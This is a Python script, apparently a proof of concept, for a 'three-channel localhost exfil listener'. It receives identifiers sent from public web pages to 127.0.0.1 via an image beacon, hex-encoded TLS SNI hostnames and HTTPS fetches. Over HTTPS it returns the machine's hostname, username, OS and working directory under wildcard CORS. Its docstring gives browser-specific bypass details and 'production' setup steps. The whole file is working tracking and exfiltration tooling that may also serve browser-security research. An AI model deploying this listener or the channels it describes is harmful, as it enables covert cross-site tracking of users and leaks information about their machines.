#!/usr/bin/env python3
"""
Three-channel localhost exfil listener.

Channel 1 — IMG / HTTP  (Safari only, no cert)
  <img src="http://127.0.0.1:8765/track?id=<identifier>">
  Safari allows HTTP images from a public HTTPS page (passive mixed-content
  carve-out). Identifier travels in the URL query string.

Channel 2 — TLS SNI  (Safari + Chrome, no cert)
  fetch('https://id-<hex>.sni.localtest.me:9443/')
  Identifier is hex-encoded into the SNI hostname. The raw ClientHello
  arrives in plaintext before any certificate check. No TLS handshake
  is completed; the browser sees a network error (expected).

Channel 3 — HTTPS fetch  (Safari, requires valid cert)
  fetch('https://<your-domain>:8443/track?id=<identifier>')
  Full bidirectional HTTP over TLS. Safari places no gate on
  HTTPS-to-localhost from a public HTTPS origin. The domain must resolve
  to 127.0.0.1 and present a certificate trusted by the browser.

  For local testing: copy localhost-cert.pem / localhost-key.pem from
  safari-localhost-test/ (generated with mkcert + mkcert -install).
  For production: register a domain, point its A record to 127.0.0.1,
  and obtain a Let's Encrypt certificate. Any browser-trusted cert works.

Usage:
  python3 server.py                            # channels 1 + 2 only
  python3 server.py --cert cert.pem --key key.pem   # all three channels

No external dependencies. Python 3.9+.
"""

import argparse, json, os, platform, socket, ssl, sys, threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs


def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001080600000"
    "01f15c489000000017352474200aece1ce90000000d494441540"
    "78963600000000200017af4ed1d0000000049454e44ae426082"
)

CORS_HEADERS = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "*",
    "Access-Control-Expose-Headers": "*",
    "Cache-Control": "no-store",
}


def http_response(status, extra_headers, body=b""):
    headers = {**CORS_HEADERS, **extra_headers, "Content-Length": len(body), "Connection": "close"}
    head = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
    return f"HTTP/1.1 {status}\r\n{head}\r\n\r\n".encode() + body


def dispatch(raw, addr, scheme):
    line = raw.split(b"\r\n")[0].decode("latin-1", errors="replace")
    parts = line.split()
    if len(parts) < 2:
        return None
    qs = parse_qs(urlparse(parts[1]).query)
    identifier = qs.get("id", [None])[0]
    if identifier is not None:
        ch = "IMG " if scheme == "http" else "HTTPS"
        print(f"\n[{ts()}] {ch}  src={addr[0]}:{addr[1]}")
        print(f"  id = {identifier!r}")

    if scheme == "https":
        payload = {
            "id": identifier,
            "received_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": socket.gethostname(),
            "user": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
            "os": platform.platform(),
            "cwd": os.getcwd(),
        }
        body = json.dumps(payload, indent=2).encode()
    else:
        body = json.dumps({"received": True, "id": identifier}).encode()

    return http_response("200 OK", {"Content-Type": "application/json"}, body)


# ── Channel 1: HTTP ───────────────────────────────────────────────────────────
def handle_http(conn, addr):
    try:
        conn.settimeout(5.0)
        raw = conn.recv(4096)
        if not raw:
            return
        resp = dispatch(raw, addr, "http")
        conn.sendall(resp or http_response("200 OK", {"Content-Type": "image/png"}, PNG))
    except (socket.timeout, OSError):
        pass
    finally:
        try: conn.close()
        except OSError: pass


def run_http(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(64)
    print(f"[+] CH1  IMG/HTTP    0.0.0.0:{port}/track?id=...")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_http, args=(conn, addr), daemon=True).start()
        except OSError: break


# ── Channel 2: raw TCP SNI ────────────────────────────────────────────────────
def parse_sni(data):
    try:
        if len(data) < 5 or data[0] != 0x16 or data[5] != 0x01:
            return None
        pos = 9 + 2 + 32
        sid = data[pos]; pos += 1 + sid
        cs  = int.from_bytes(data[pos:pos+2], "big"); pos += 2 + cs
        cm  = data[pos]; pos += 1 + cm
        ext_end = pos + 2 + int.from_bytes(data[pos:pos+2], "big"); pos += 2
        while pos + 4 <= ext_end:
            t = int.from_bytes(data[pos:pos+2], "big")
            l = int.from_bytes(data[pos+2:pos+4], "big"); pos += 4
            if t == 0:
                nl = int.from_bytes(data[pos+3:pos+5], "big")
                return data[pos+5:pos+5+nl].decode("ascii", errors="replace")
            pos += l
    except Exception:
        pass
    return None


def decode_sni(sni):
    label = sni.split(".")[0]
    if not label.startswith("id-"):
        return None
    hex_part = label[3:]
    parts = hex_part.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        hex_part = parts[0]
    try:
        return bytes.fromhex(hex_part).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return None


def handle_sni(conn, addr):
    try:
        conn.settimeout(3.0)
        data = conn.recv(8192)
        if not data:
            return
        sni = parse_sni(data)
        if sni:
            decoded = decode_sni(sni)
            print(f"\n[{ts()}] SNI   src={addr[0]}:{addr[1]}")
            print(f"  hostname = {sni}")
            if decoded is not None:
                print(f"  id       = {decoded!r}")
    except (socket.timeout, OSError):
        pass
    finally:
        try: conn.close()
        except OSError: pass


def run_sni(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(64)
    print(f"[+] CH2  SNI/rawTCP  0.0.0.0:{port}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_sni, args=(conn, addr), daemon=True).start()
        except OSError: break


# ── Channel 3: HTTPS ─────────────────────────────────────────────────────────
def handle_https(conn, addr):
    try:
        conn.settimeout(10.0)
        raw = conn.recv(8192)
        if not raw:
            return
        resp = dispatch(raw, addr, "https")
        if resp:
            conn.sendall(resp)
    except (socket.timeout, OSError, ssl.SSLError):
        pass
    finally:
        try: conn.close()
        except OSError: pass


def run_https(port, certfile, keyfile):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    raw_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_srv.bind(("0.0.0.0", port)); raw_srv.listen(64)
    print(f"[+] CH3  HTTPS       0.0.0.0:{port}/track?id=...  (cert: {certfile})")
    while True:
        try:
            raw_conn, addr = raw_srv.accept()
            try:
                tls_conn = ctx.wrap_socket(raw_conn, server_side=True)
            except ssl.SSLError:
                raw_conn.close()
                continue
            threading.Thread(target=handle_https, args=(tls_conn, addr), daemon=True).start()
        except OSError: break


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    sys.stdout.reconfigure(line_buffering=True)
    p = argparse.ArgumentParser()
    p.add_argument("--http-port", type=int, default=8765)
    p.add_argument("--sni-port",  type=int, default=9443)
    p.add_argument("--tls-port",  type=int, default=8443)
    p.add_argument("--cert", default="localhost-cert.pem")
    p.add_argument("--key",  default="localhost-key.pem")
    args = p.parse_args()

    threading.Thread(target=run_http, args=(args.http_port,), daemon=True).start()
    threading.Thread(target=run_sni,  args=(args.sni_port,),  daemon=True).start()

    if os.path.exists(args.cert) and os.path.exists(args.key):
        threading.Thread(target=run_https,
                         args=(args.tls_port, args.cert, args.key),
                         daemon=True).start()
    else:
        print(f"[!] CH3  HTTPS skipped — cert/key not found ({args.cert} / {args.key})")
        print(f"         Copy from safari-localhost-test/ or provide --cert / --key")

    print(f"[+] Ctrl-C to stop\n")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        print("\n[+] done")


if __name__ == "__main__":
    main()
